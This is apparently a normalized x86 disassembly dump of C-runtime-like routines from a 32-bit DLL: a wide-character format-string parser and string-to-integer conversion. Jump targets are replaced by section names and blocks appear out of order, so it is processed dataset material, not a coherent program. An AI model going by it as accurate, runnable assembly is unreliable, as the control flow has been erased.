pop ecx
pop ecx
test eax eax
jne r-xdata
jmp r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
pop ecx
mov cx [ edi ]
movzx eax ax
inc edi
inc edi
mov [ ebp - 0x2cc ] eax
mov [ ebp - 0x300 ] edi
cmp cx ax
jne r-xdata
lea eax [ edi + 0x2 ]
cmp cx [ eax ]
jne r-xdata
mov [ ebp - 0x318 ] esi
mov [ ebp - 0x340 ] esi
mov [ ebp - 0x2e8 ] esi
mov [ ebp - 0x2f4 ] esi
mov [ ebp - 0x2d4 ] esi
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2ed ] 0x0
mov [ ebp - 0x2df ] 0x0
mov [ ebp - 0x2d5 ] 0x0
mov [ ebp - 0x2c1 ] 0x0
mov [ ebp - 0x2de ] 0x0
mov [ ebp - 0x2cd ] 0x0
mov [ ebp - 0x2d6 ] 0x1
xor esi esi
movzx eax [ edi ]
test ax ax
jne r-xdata
push [ ebp - 0x2dc ]
push [ ebp - 0x2cc ]
mov eax 0xffff
cmp ax [ ebp - 0x2cc ]
jne r-xdata
mov edi eax
cmp ebx 0x4e
jg r-xdata
movzx eax bl
push eax
call sub_10018646
pop ecx
test eax eax
je r-xdata
push 0x8
push eax
xor esi esi
call sub_1001784a
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x310 ] 0x1
jne r-xdata
push [ ebp - 0x30c ]
call sub_1000bf59
pop ecx
cmp [ edi ] 0x25
jne r-xdata
cmp ebx 0x68
je r-xdata
je r-xdata
mov eax [ ebp - 0x2d4 ]
inc [ ebp - 0x2f4 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x2d4 ] eax
jmp r-xdata
cmp [ ebp - 0x328 ] 0x1
pop ebx
jne r-xdata
mov eax 0xffff
cmp ax [ ebp - 0x2cc ]
jne r-xdata
push [ ebp - 0x2e4 ]
call sub_1000bf59
pop ecx
mov eax [ ebp - 0x300 ]
cmp [ eax + 0x2 ] 0x6e
jne r-xdata
dec [ ebp - 0x2d6 ]
dec [ ebp - 0x2cd ]
cmp ebx 0x6c
je r-xdata
cmp [ ebp - 0x2c1 ] 0x0
je r-xdata
cmp ebx 0x2a
je r-xdata
mov eax [ ebp - 0x308 ]
test eax eax
jne r-xdata
mov edi eax
inc edi
inc edi
movzx ebx [ edi ]
test ebx 0xff00
jne r-xdata
cmp [ ebp - 0x2d5 ] 0x0
mov [ ebp - 0x300 ] edi
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x2d5 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
cmp [ ebp - 0x330 ] 0x0
je r-xdata
cmp [ ebp - 0x2dd ] al
jne r-xdata
cmp [ ebp - 0x2cd ] 0x0
mov [ ebp - 0x304 ] esi
mov [ ebp - 0x2c1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x324 ]
mov esi [ eax ]
mov [ ebp - 0x32c ] eax
add eax 0x4
mov [ ebp - 0x324 ] eax
inc [ ebp - 0x31c ]
mov edi eax
mov [ ebp - 0x2fc ] esi
mov [ ebp - 0x2f8 ] esi
jmp r-xdata
inc [ ebp - 0x2d6 ]
inc [ ebp - 0x2cd ]
jmp r-xdata
inc [ ebp - 0x2c1 ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
mov ecx [ ebp - 0x334 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
movzx ebx [ edi ]
or ebx 0x20
mov [ ebp - 0x2ec ] ebx
cmp ebx 0x6e
je r-xdata
movzx eax [ edi ]
cmp ax 0x53
je r-xdata
movzx ecx [ edi + 0x2 ]
cmp cx 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x2f4 ]
test ecx ecx
je r-xdata
cmp ebx 0x63
je r-xdata
mov [ ebp - 0x2cd ] 0xff
mov [ ebp - 0x2cd ] 0x1
cmp ax 0x43
jne r-xdata
cmp cx 0x33
jne r-xdata
lea eax [ edi + 0x4 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x2d6 ]
jmp r-xdata
cmp ebx 0x6f
jg r-xdata
cmp [ ebp - 0x2d4 ] 0x0
je r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
cmp ebx 0x7b
je r-xdata
cmp cx 0x64
je r-xdata
lea eax [ edi + 0x4 ]
cmp [ eax ] 0x32
jne r-xdata
mov eax ebx
sub eax 0x70
je r-xdata
je r-xdata
mov esi [ ebp - 0x304 ]
mov edi [ ebp - 0x300 ]
push [ ebp - 0x2dc ]
lea esi [ ebp - 0x2c8 ]
call sub_1000f76e
jmp r-xdata
cmp cx 0x69
je r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x2d6 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x2cc ]
push 0x2d
pop eax
cmp ax bx
jne r-xdata
cmp ebx 0x63
je r-xdata
movzx eax ax
pop ecx
mov ecx 0xffff
mov [ ebp - 0x2cc ] eax
cmp cx ax
je r-xdata
cmp cx 0x6f
je r-xdata
push 0x2b
pop eax
cmp ax bx
jne r-xdata
mov [ ebp - 0x2df ] 0x1
jmp r-xdata
cmp [ ebp - 0x2cd ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
push 0x64
pop eax
cmp ebx eax
je r-xdata
cmp cx 0x78
je r-xdata
cmp [ ebp - 0x31c ] 0x0
je r-xdata
dec [ ebp - 0x2d4 ]
jne r-xdata
push [ ebp - 0x2dc ]
dec [ ebp - 0x2c8 ]
push [ ebp - 0x2cc ]
mov edi esi
call sub_1000f756
pop ecx
pop ecx
mov [ ebp - 0x2de ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x2d4 ]
mov [ ebp - 0x2f4 ] 0x1
jle r-xdata
cmp cx 0x58
jne r-xdata
cmp [ ebp - 0x2c1 ] 0x0
mov edi [ ebp - 0x318 ]
jne r-xdata
cmp [ ebp - 0x2c1 ] 0x0
jne r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
pop ecx
movzx ebx ax
test ecx ecx
je r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
movzx edx ax
mov eax 0xffff
pop ecx
mov [ ebp - 0x2cc ] edx
cmp ax dx
je r-xdata
mov eax [ ebp - 0x2d4 ]
dec [ ebp - 0x2d4 ]
test eax eax
je r-xdata
mov ebx [ ebp - 0x2cc ]
push 0x2d
pop eax
cmp ax bx
jne r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x2cc ]
cmp [ edi ] ax
jne r-xdata
cmp ebx 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x2df ] 0x0
je r-xdata
mov esi 0xff00
cmp [ ebp - 0x2df ] 0x0
mov edi [ ebp - 0x318 ]
je r-xdata
mov edi 0xff00
mov [ ebp - 0x2c1 ] 0x1
jmp r-xdata
push [ ebp - 0x2dc ]
dec [ ebp - 0x2c8 ]
push edx
call sub_1000f756
pop ecx
pop ecx
cmp ebx 0x63
je r-xdata
cmp edi esi
je r-xdata
push 0x2b
pop eax
cmp ax bx
jne r-xdata
mov [ ebp - 0x2df ] 0x1
jmp r-xdata
cmp [ ebp - 0x2cd ] 0x0
jle r-xdata
push [ ebp - 0x2dc ]
push eax
jmp r-xdata
dec [ ebp - 0x2dd ]
cmp [ ebp - 0x2d5 ] 0x0
jne r-xdata
push 0x2d
pop eax
xor ebx ebx
cmp ax [ ebp - 0x2cc ]
jne r-xdata
cmp ebx 0x69
je r-xdata
cmp [ ebp - 0x2ec ] 0x46
jne r-xdata
neg edi
test esi ebx
jne r-xdata
cmp [ ebp - 0x2ec ] 0x70
je r-xdata
mov eax [ ebp - 0x2fc ]
mov ecx [ ebp - 0x2f8 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x2fc ] eax
mov [ ebp - 0x2f8 ] ecx
jmp r-xdata
test edi ebx
jne r-xdata
cmp [ ebp - 0x2ec ] 0x70
je r-xdata
cmp [ ebp - 0x2d5 ] 0x0
jne r-xdata
cmp [ ebp - 0x2d5 ] 0x0
jne r-xdata
cmp ebx 0x73
jne r-xdata
push 0x30
pop eax
cmp ax bx
jne r-xdata
dec [ ebp - 0x2d4 ]
jne r-xdata
inc edi
push 0x5e
inc edi
pop eax
cmp ax [ edi ]
jne r-xdata
mov [ ebp - 0x2de ] 0x1
call sub_1000f756
pop ecx
pop ecx
mov edi [ ebp - 0x300 ]
inc [ ebp - 0x2dd ]
inc edi
inc edi
mov [ ebp - 0x300 ] edi
jmp r-xdata
mov eax [ ebp - 0x32c ]
mov [ ebp - 0x324 ] eax
jmp r-xdata
push 0x2b
pop eax
cmp ax [ ebp - 0x2cc ]
jne r-xdata
mov ecx [ ebp - 0x2e4 ]
mov [ ecx ] ax
inc ebx
jmp r-xdata
mov [ ebp - 0x2ec ] eax
cmp ebx 0x6e
jne r-xdata
cmp [ ebp - 0x2e8 ] 0x0
je r-xdata
and [ ebp - 0x2e8 ] 0x0
push [ ebp - 0x2dc ]
dec [ ebp - 0x2c8 ]
push ebx
call sub_1000f756
pop ecx
pop ecx
movzx eax bl
push eax
call sub_100186ca
pop ecx
test eax eax
je r-xdata
test esi ebx
jne r-xdata
push [ ebp - 0x2dc ]
dec [ ebp - 0x2c8 ]
push ebx
call sub_1000f756
pop ecx
pop ecx
movzx eax bl
push eax
call sub_100186ca
pop ecx
test eax eax
je r-xdata
test edi ebx
jne r-xdata
inc [ ebp - 0x308 ]
cmp ebx 0x63
je r-xdata
inc edi
inc edi
jmp r-xdata
cmp [ ebp - 0x2de ] 0x0
je r-xdata
cmp ebx 0x7b
jne r-xdata
cmp dx 0x9
jb r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
pop ecx
movzx ebx ax
push 0x78
pop esi
mov eax esi
mov [ ebp - 0x2cc ] ebx
cmp ax bx
je r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
movzx ebx ax
pop ecx
mov [ ebp - 0x2cc ] ebx
test ecx ecx
je r-xdata
cmp [ ebp - 0x30c ] 0x0
jne r-xdata
add edi 0x2
mov [ ebp - 0x2ed ] 0xff
cmp [ ebp - 0x2f4 ] 0x0
jne r-xdata
dec [ ebp - 0x2d4 ]
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
movzx eax ax
pop ecx
mov [ ebp - 0x2cc ] eax
cmp [ ebp - 0x2d5 ] 0x0
mov edi [ ebp - 0x2c8 ]
je r-xdata
cmp [ ebp - 0x2d5 ] 0x0
jne r-xdata
push ebx
shl edi 0x4
call sub_1000f720
movzx ebx ax
pop ecx
mov [ ebp - 0x2cc ] ebx
movzx eax bl
push eax
call sub_10018646
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x2f8 ]
mov esi [ ebp - 0x2fc ]
shld eax esi 0x4
push ebx
shl esi 0x4
mov [ ebp - 0x2f8 ] eax
call sub_1000f720
movzx ebx ax
pop ecx
mov [ ebp - 0x2cc ] ebx
movzx eax bl
push eax
call sub_10018646
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x2de ] 0x0
je r-xdata
cmp [ ebp - 0x2f4 ] 0x0
je r-xdata
and [ ebp - 0x318 ] 0x0
push edx
push 0x5
lea eax [ ebp - 0x318 ]
push esi
push eax
call sub_100184ef
add esp 0x10
test eax eax
je r-xdata
mov [ esi ] dx
inc esi
inc esi
jmp r-xdata
movzx eax dx
mov ecx eax
xor ebx ebx
and ecx 0x7
inc ebx
shl ebx cl
mov ecx [ ebp - 0x30c ]
shr eax 0x3
movsx eax [ eax + ecx ]
movsx ecx [ ebp - 0x2ed ]
xor eax ecx
test eax ebx
mov ebx [ ebp - 0x2ec ]
je r-xdata
cmp dx 0x20
jne r-xdata
cmp dx 0xd
jbe r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
cmp [ ebp - 0x2f4 ] 0x0
movzx ebx ax
pop ecx
mov [ ebp - 0x2cc ] ebx
je r-xdata
push 0x58
pop eax
cmp ax bx
je r-xdata
mov [ ebp - 0x2c1 ] 0x1
jmp r-xdata
push 0x2000
push 0x0
push [ ebp - 0x30c ]
call sub_1000b660
add esp 0xc
push 0x5d
pop eax
cmp ax [ edi ]
jne r-xdata
push 0x2000
call sub_100119e5
pop ecx
mov [ ebp - 0x30c ] eax
test eax eax
je r-xdata
test [ ebp - 0x2cc ] 0xff00
jne r-xdata
or [ ebp - 0x2d4 ] 0xffffffff
cmp [ ebp - 0x31c ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x308 ]
mov esi [ ebp - 0x304 ]
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
movzx ebx ax
pop ecx
mov [ ebp - 0x2cc ] ebx
jmp r-xdata
dec [ ebp - 0x2d4 ]
je r-xdata
cmp [ ebp - 0x2ec ] 0x6f
jne r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
movzx ebx ax
pop ecx
mov [ ebp - 0x2cc ] ebx
jmp r-xdata
dec [ ebp - 0x2d4 ]
je r-xdata
cmp [ ebp - 0x2ec ] 0x6f
jne r-xdata
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x304 ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
add esi [ ebp - 0x318 ]
cmp eax 0x16
je r-xdata
mov [ ebp - 0x304 ] esi
jmp r-xdata
mov [ ebp - 0x2ec ] esi
jmp r-xdata
sub [ ebp - 0x2d4 ] 0x2
cmp [ ebp - 0x2d4 ] 0x1
jge r-xdata
mov [ ebp - 0x2e8 ] 0x1
cmp [ ebp - 0x2ec ] esi
je r-xdata
mov esi [ ebp - 0x340 ]
jmp r-xdata
push eax
mov eax [ ebp - 0x30c ]
inc edi
pop esi
inc edi
mov [ eax + 0xb ] 0x20
jmp r-xdata
mov [ ebp - 0x328 ] 0x1
lea eax [ ebp - 0x33c ]
push eax
mov eax [ ebp - 0x33c ]
mov [ ebp - 0x320 ] 0x2e
push [ eax + 0xac ]
mov eax [ eax + 0xbc ]
push [ eax ]
lea eax [ ebp - 0x320 ]
push eax
call sub_10018d7b
movzx eax [ ebp - 0x320 ]
movsx ecx [ ebp - 0x2cc ]
add esp 0x10
cmp eax ecx
jne r-xdata
movzx eax [ ebp - 0x2cc ]
push eax
call sub_10018646
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x2d6 ] 0x0
je r-xdata
mov eax [ ebp - 0x2fc ]
mov [ esi ] eax
mov eax [ ebp - 0x2f8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x2ec ] 0x78
je r-xdata
imul edi edi 0xa
jmp r-xdata
push 0x38
pop eax
cmp ax bx
jbe r-xdata
cmp [ ebp - 0x2ec ] 0x78
je r-xdata
push 0x0
push 0xa
push [ ebp - 0x2f8 ]
push [ ebp - 0x2fc ]
call sub_100169a0
mov esi eax
mov [ ebp - 0x2f8 ] edx
jmp r-xdata
push 0x38
pop eax
cmp ax bx
jbe r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e74b
add esp 0x14
jmp r-xdata
cmp eax 0x22
jne r-xdata
inc [ ebp - 0x2c1 ]
push [ ebp - 0x2dc ]
dec [ ebp - 0x2c8 ]
push ebx
call sub_1000f756
pop ecx
pop ecx
push 0x30
pop ebx
jmp r-xdata
cmp [ ebp - 0x2f4 ] 0x0
je r-xdata
movzx eax [ edi ]
push 0x5d
pop ecx
cmp cx ax
jne r-xdata
cmp [ ebp - 0x2e8 ] 0x0
je r-xdata
mov eax [ ebp - 0x2d4 ]
dec [ ebp - 0x2d4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2d4 ]
dec [ ebp - 0x2d4 ]
test eax eax
je r-xdata
mov [ esi ] di
mov [ esi ] edi
jmp r-xdata
inc [ ebp - 0x2e8 ]
cmp [ ebp - 0x2f4 ] 0x0
movzx eax bx
lea edi [ edi + eax - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
inc [ ebp - 0x2e8 ]
movzx eax bx
sub eax 0x30
cdq
add esi eax
adc [ ebp - 0x2f8 ] edx
cmp [ ebp - 0x2f4 ] 0x0
mov [ ebp - 0x2fc ] esi
je r-xdata
mov eax [ ebp - 0x2f8 ]
mov esi [ ebp - 0x2fc ]
shld eax esi 0x3
shl esi 0x3
mov [ ebp - 0x2f8 ] eax
jmp r-xdata
mov [ ebp - 0x2cc ] ebx
mov [ ebp - 0x2ec ] 0x6f
jmp r-xdata
dec [ ebp - 0x2d4 ]
jne r-xdata
movzx eax ax
inc edi
push 0x2d
pop ecx
inc edi
cmp cx ax
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x2dc ]
dec [ ebp - 0x2c8 ]
push [ ebp - 0x2cc ]
call sub_1000f756
cmp [ ebp - 0x2e8 ] 0x0
pop ecx
pop ecx
je r-xdata
push 0x65
pop eax
cmp ax [ ebp - 0x2cc ]
je r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
mov ecx [ ebp - 0x2e4 ]
movzx eax ax
mov [ ebp - 0x2cc ] eax
mov ax [ ebp - 0x320 ]
mov [ ecx + ebx * 2 ] ax
lea eax [ ebp - 0x310 ]
push eax
lea eax [ ebp - 0x2c0 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x2e4 ]
lea esi [ ebp - 0x314 ]
call sub_1000f6c6
add esp 0x10
test eax eax
je r-xdata
movsx ax [ ebp - 0x2cc ]
mov ecx [ ebp - 0x2e4 ]
inc [ ebp - 0x2e8 ]
mov [ ecx + ebx * 2 ] ax
lea eax [ ebp - 0x310 ]
push eax
lea eax [ ebp - 0x2c0 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x2e4 ]
lea esi [ ebp - 0x314 ]
call sub_1000f6c6
add esp 0xc
test eax eax
je r-xdata
inc [ ebp - 0x2c1 ]
mov edx [ ebp - 0x30c ]
movzx ecx ax
movzx esi ax
mov eax ecx
shr eax 0x3
add eax edx
and ecx 0x7
mov dl 0x1
shl dl cl
or [ eax ] dl
test si si
je r-xdata
mov esi [ ebp - 0x304 ]
mov [ ebp - 0x300 ] edi
jmp r-xdata
cmp [ ebp - 0x2d5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2d4 ]
dec [ ebp - 0x2d4 ]
test eax eax
je r-xdata
push 0x45
pop eax
cmp ax [ ebp - 0x2cc ]
jne r-xdata
test [ ebp - 0x2cc ] 0xff00
jne r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
movzx eax ax
pop ecx
mov [ ebp - 0x2cc ] eax
test eax 0xff00
je r-xdata
movzx ecx [ edi ]
push 0x5d
pop edx
cmp dx cx
je r-xdata
mov esi [ ebp - 0x314 ]
mov ecx [ ebp - 0x2e4 ]
inc [ ebp - 0x308 ]
xor eax eax
lea esi [ esi + esi + 0x2 ]
push esi
mov [ ecx + ebx * 2 ] ax
call sub_100119e5
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x2e4 ]
push 0x65
pop eax
mov [ ecx + ebx * 2 ] ax
lea eax [ ebp - 0x310 ]
push eax
lea eax [ ebp - 0x2c0 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x2e4 ]
lea esi [ ebp - 0x314 ]
call sub_1000f6c6
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x2cc ]
push eax
call sub_10018646
pop ecx
test eax eax
je r-xdata
movzx ecx cx
inc edi
inc edi
cmp si cx
jae r-xdata
lea eax [ esi - 0x1 ]
push eax
push [ ebp - 0x2e4 ]
push esi
push edi
xor esi esi
push esi
call sub_10018d5b
add esp 0x14
cmp eax esi
je r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
pop ecx
movzx eax ax
push 0x2d
pop ecx
mov [ ebp - 0x2cc ] eax
cmp cx ax
jne r-xdata
mov eax [ ebp - 0x2d4 ]
dec [ ebp - 0x2d4 ]
test eax eax
je r-xdata
movzx eax si
movzx esi cx
movzx eax cx
jmp r-xdata
lea eax [ ebp - 0x33c ]
push eax
movsx eax [ ebp - 0x2d6 ]
push edi
push [ ebp - 0x304 ]
dec eax
push eax
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
push edi
call sub_1000bf59
add esp 0x14
jmp r-xdata
cmp eax 0x16
je r-xdata
push 0x2b
pop eax
cmp ax [ ebp - 0x2cc ]
jne r-xdata
push ecx
mov ecx [ ebp - 0x2e4 ]
pop eax
mov [ ecx + ebx * 2 ] ax
lea eax [ ebp - 0x310 ]
push eax
lea eax [ ebp - 0x2c0 ]
push eax
inc ebx
push ebx
call sub_1000f6c6
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x2e4 ]
mov cx [ ebp - 0x2cc ]
inc [ ebp - 0x2e8 ]
mov [ eax + ebx * 2 ] cx
lea eax [ ebp - 0x310 ]
push eax
lea eax [ ebp - 0x2c0 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x2e4 ]
lea esi [ ebp - 0x314 ]
call sub_1000f6c6
add esp 0xc
test eax eax
je r-xdata
xor esi esi
jmp r-xdata
sub eax esi
inc eax
movzx edx si
movzx esi ax
cmp si ax
ja r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
cmp eax 0x22
jne r-xdata
test [ ebp - 0x2cc ] 0xff00
jne r-xdata
mov eax [ ebp - 0x2d4 ]
dec [ ebp - 0x2d4 ]
test eax eax
jne r-xdata
jmp r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
movzx eax ax
pop ecx
mov [ ebp - 0x2cc ] eax
test eax 0xff00
je r-xdata
mov ecx [ ebp - 0x30c ]
mov eax edx
shr eax 0x3
add eax ecx
mov ecx edx
and ecx 0x7
mov bl 0x1
shl bl cl
or [ eax ] bl
inc edx
dec esi
jne r-xdata
mov ebx [ ebp - 0x2ec ]
movzx eax [ ebp - 0x2cc ]
push eax
call sub_10018646
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
movzx eax ax
pop ecx
mov [ ebp - 0x2cc ] eax
and [ ebp - 0x2d4 ] eax
jmp r-xdata
mov eax [ ebp - 0x2d4 ]
dec [ ebp - 0x2d4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2e4 ]
mov cx [ ebp - 0x2cc ]
inc [ ebp - 0x2e8 ]
mov [ eax + ebx * 2 ] cx
lea eax [ ebp - 0x310 ]
push eax
lea eax [ ebp - 0x2c0 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x2e4 ]
lea esi [ ebp - 0x314 ]
call sub_1000f6c6
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x2dc ]
inc [ ebp - 0x2c8 ]
call sub_100186fa
movzx eax ax
pop ecx
mov [ ebp - 0x2cc ] eax
test eax 0xff00
je r-xdata
sub_100108a1
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_1000afe5
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
xor ebx ebx
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x14 ] ebx
je r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
push esi
movzx esi [ edi ]
mov [ ebp - 0x4 ] ebx
add edi 0x2
jmp r-xdata
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x18 ]
push eax
push 0x8
push esi
call sub_100177c0
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop ebx
leave
retn
movzx esi [ edi ]
inc edi
inc edi
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
movzx esi [ edi ]
inc edi
inc edi
cmp [ ebp + 0x14 ] 0x10
jne r-xdata
push esi
call sub_10018eac
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov [ ebp - 0x8 ] edx
mov ebx eax
push esi
call sub_10018eac
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp ax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
cmp eax [ ebp + 0x14 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp ax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
cmp ax 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
dec edi
test al 0x8
jne r-xdata
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
inc edi
inc edi
movzx esi [ edi ]
inc edi
inc edi
cmp ax 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
imul ecx [ ebp + 0x14 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_1000e8db
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_10018eac
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp eax [ ebp - 0x8 ]
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop esi
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx esi [ edi ]
inc edi
inc edi
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10010a9b
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_100108a1
add esp 0x14
pop ebp
retn
sub_10010ac6
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x30 ]
call sub_1000afe5
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
xor esi esi
cmp eax esi
je r-xdata
cmp ebx esi
jne r-xdata
mov [ eax ] ebx
cmp [ ebp + 0x14 ] esi
je r-xdata
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x24 ] 0x0
je r-xdata
push edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
movzx esi [ ebx ]
lea edi [ ebx + 0x2 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x30 ]
push eax
push 0x8
push esi
call sub_100177c0
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
pop ebx
leave
retn
movzx esi [ edi ]
inc edi
inc edi
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
movzx esi [ edi ]
inc edi
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
xor eax eax
xor edx edx
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x10
pop ebx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
call sub_10018eac
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
push eax
